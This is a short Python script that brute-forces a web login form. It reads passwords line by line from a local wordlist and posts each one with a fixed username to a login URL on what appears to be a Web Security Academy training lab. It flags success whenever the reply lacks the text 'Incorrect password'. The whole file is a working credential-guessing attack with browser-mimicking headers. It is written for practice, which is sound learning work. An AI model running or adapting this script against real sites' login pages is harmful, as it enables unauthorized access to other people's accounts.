import requests

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document"
} 

url = "https://0ad90062049bb6d78169ac6c00b80033.web-security-academy.net/login"
username = "auth"

with open("/home/axoryn/Downloads/wordlists/passwords.txt", "r") as f:
    for line in f:
        password = line.strip()

        data = {
            "username": username,
            "password": password
        }

        response = requests.post(url, headers=headers, data=data)

        if "Incorrect password" not in response.text: 
            print(f"[+] Password found {password}")
        else: 
            print(f"[-] Tried {password}")